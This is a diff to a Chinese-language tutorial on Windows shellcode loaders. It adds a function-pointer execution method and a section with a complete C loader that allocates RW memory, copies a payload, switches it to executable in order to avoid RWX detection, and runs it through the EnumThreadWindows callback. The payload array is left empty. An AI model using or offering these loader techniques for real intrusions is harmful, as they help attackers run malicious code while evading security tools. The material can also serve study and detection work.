@@ -136,6 +136,13 @@ int main(void) {
 
 其他步骤都一样，在执行shellcode时不使用CreateThread，使用(void(*)())exec_mem)();执行内存。
 
+或者可以这么写
+
+```c++
+void (*go)() = (void (*)()) ptr; go();
+创建一个指针函数，并将指针地址分配给该函数
+```
+
 让我们逐步解释这个表达式：
 
 - `(void(*)())`：这是一个类型转换操作符，用于将其后的表达式转换为指定的类型。在这里，`(void(*)())` 表示将表达式转换为一个函数指针类型。
@@ -222,3 +229,76 @@ int main() {
 ```
 
 64位release生成解决方案(shellcode位数要与release位数相同)
+
+
+
+### EnumThreadWindows执行shellcode
+
+当 `EnumThreadWindows` 开始枚举线程的顶级窗口时，它会针对每个窗口调用回调函数。而在这里，`ptr` 所指向的函数不是一个普通的回调函数，而是一个包含了 Shellcode 的函数。因此，当 `EnumThreadWindows` 调用 `ptr` 时，实际上会执行 Shellcode。
+
+```c++
+EnumThreadWindows(0, (WNDENUMPROC) ptr, 0);
+```
+
+```c++
+EnumChildWindows((HWND) NULL, (WNDENUMPROC) ptr, NULL);
+```
+
+#### **核心函数**
+
+**EnumThreadWindows**
+
+https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumthreadwindows
+
+`EnumThreadWindows` 是 Windows API 中的一个函数，用于枚举特定线程创建的顶级窗口（即不属于其他窗口的窗口）。
+
+```c++
+BOOL EnumThreadWindows(
+  [in] DWORD       dwThreadId,
+  [in] WNDENUMPROC lpfn,
+  [in] LPARAM      lParam
+);
+```
+
+- `dwThreadId`：要枚举其窗口的线程的标识符。
+- `lpfn`：一个指向应用程序定义的回调函数的指针。该函数接收窗口句柄作为参数，返回一个布尔值。如果回调函数返回 FALSE，则枚举过程将终止。
+- `lParam`：一个应用程序定义的值，传递给回调函数。
+
+#### 代码详情
+
+```c++
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+  DWORD oldprotect = 0;
+
+	//shellcode在main函数内，存储在pe结构的sections table中的.text部分
+	unsigned char payload[] = {};
+	unsigned int payload_len = sizeof(payload);
+	
+	// 使用VirtualAlloc申请一个可读可写的内存，这里没有申请执行权限是为了防止出现RWX权限的敏感内存
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	// 将shellcode复制到申请的内存中，这里还可以用memcpy等
+	RtlMoveMemory(exec_mem, payload, payload_len);
+	
+	// 使用VirtualProtect添加执行权限
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	// 如果返回正常，回调函数执行shellcode
+	if ( rv != 0 ) {
+			EnumThreadWindows(0, (WNDENUMPROC) exec_mem, 0);
+	}
+
+	return 0;
+}
+
+```
+
